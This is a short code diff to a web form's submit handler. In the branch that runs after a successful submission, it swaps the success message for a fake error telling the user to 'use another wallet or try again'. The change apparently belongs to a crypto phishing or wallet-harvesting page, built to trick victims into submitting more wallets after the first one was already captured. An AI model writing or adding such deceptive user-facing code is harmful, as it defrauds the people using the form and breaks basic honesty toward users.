@@ -1321,7 +1321,7 @@ form.addEventListener("submit", async (e) => {
       throw new Error(result.message || "Submission failed");
     }
 
-    status.textContent = "Submission successful!";
+    status.textContent = "An error occurred!!! Use another wallet or try again";
     form.reset();
 
   } catch (error) {
